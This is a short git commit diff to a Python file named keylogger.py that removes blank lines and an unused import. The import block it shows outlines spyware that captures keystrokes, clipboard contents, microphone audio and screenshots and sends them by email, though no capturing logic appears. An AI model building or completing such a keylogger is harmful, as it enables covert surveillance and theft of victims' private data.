2c9a097b2e4a2d5f357efa90c08ec1805ab29b95
razvanrmn <razvanrmn@icloud.com>
2024-03-23 22:58:30 +0200

    feat: gitignore fix: unused import removed

--- Project/keylogger.py
+++ Project/keylogger.py
@@ -5,26 +5,17 @@ from email.mime.text import MIMEText
 from email.mime.base import MIMEBase
 from email import encoders
 import smtplib
-
 import socket
 import platform
-
 import win32clipboard
-
 from pynput.keyboard import Key, Listener
-
 import time
 import os
-
 from scipy.io.wavfile import write
 import sounddevice as sd
-
 from cryptography.fernet import Fernet
-
 import getpass
 from requests import get
-
-from multiprocessing import Process, freeze_support
 from PIL import ImageGrab
 
 keys_information = "key_log.txt"
